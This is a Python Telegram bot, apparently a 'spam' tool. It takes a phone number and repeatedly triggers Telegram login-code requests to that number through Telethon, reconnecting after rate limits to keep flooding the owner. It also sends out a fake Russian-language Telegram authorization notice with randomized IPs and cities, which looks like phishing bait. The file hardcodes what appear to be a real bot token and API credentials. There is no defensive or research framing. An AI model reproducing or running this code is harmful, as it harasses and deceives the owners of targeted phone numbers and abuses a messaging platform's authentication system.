import asyncio
import random
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from telethon import TelegramClient
from telethon.errors import FloodWaitError

BOT_TOKEN = "8830187981:AAGZu4sKhuTpTSI8sPgliF2lvXYJotP1k1s"

accounts = [
    {'api_id': 33180472, 'api_hash': '025b7581493ae0d83c3946f27a149057'}
]

ips = [
    ('79.137.179.56', 'Taraz, Kazakhstan'),
    ('185.165.29.4', 'Moscow, Russia'),
    ('194.67.213.5', 'Kyiv, Ukraine'),
    ('89.42.58.12', 'Warsaw, Poland'),
    ('94.45.120.67', 'Berlin, Germany'),
    ('212.58.100.35', 'London, UK'),
    ('77.51.45.22', 'Paris, France'),
    ('176.99.12.88', 'Madrid, Spain'),
]

spam_tasks = {}

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Отправь номер (например, +380963836766)")

async def stop_spam(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    if chat_id in spam_tasks:
        task = spam_tasks.pop(chat_id)
        if not task.done():
            task.cancel()
            try:
                await task
            except asyncio.CancelledError:
                pass
        await update.message.reply_text("Остановлено")
    else:
        await update.message.reply_text("Нет активного спама")

async def handle_number(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    if chat_id in spam_tasks:
        await update.message.reply_text("Уже идёт, останови /stop")
        return
    phone = update.message.text.strip()
    if not phone.startswith('+'):
        await update.message.reply_text("Формат: +380...")
        return
    await update.message.reply_text(f"Запущено на {phone}")

    async def spam():
        client = None
        while True:
            try:
                if client is None:
                    acc = accounts[0]
                    client = TelegramClient(None, acc['api_id'], acc['api_hash'])
                    await client.connect()
                await client.send_code_request(phone)
                ip, place = random.choice(ips)
                msg = (
                    f"Если вы не запрашивали подобного, нажмите «Отклонить» или проигнорируйте это сообщение.\n\n"
                    f"Мы получили запрос на авторизацию Вашего аккаунта в Telegram на cabinet.presscode.app.\n\n"
                    f"Чтобы принять запрос, нажмите кнопку «Принять» ниже:\n\n"
                    f"Браузер: Unknown browser on Unknown OS\n"
                    f"IP: {ip} ({place})"
                )
                await context.bot.send_message(chat_id, msg)
                await asyncio.sleep(0.02)
            except FloodWaitError as e:
                sec = e.seconds
                await context.bot.send_message(chat_id, f"Ожидание {sec} сек")
                await client.disconnect()
                client = None
                await asyncio.sleep(sec)
            except Exception as e:
                err = str(e)
                if "all available options" in err or "ResendCodeRequest" in err:
                    await context.bot.send_message(chat_id, "Методы исчерпаны, переподключение")
                    await client.disconnect()
                    client = None
                else:
                    await context.bot.send_message(chat_id, f"Ошибка: {err[:40]}")
                    await client.disconnect()
                    client = None
                await asyncio.sleep(0.05)

    task = asyncio.create_task(spam())
    spam_tasks[chat_id] = task

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("stop", stop_spam))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_number))
    app.run_polling()

if __name__ == "__main__":
    main()
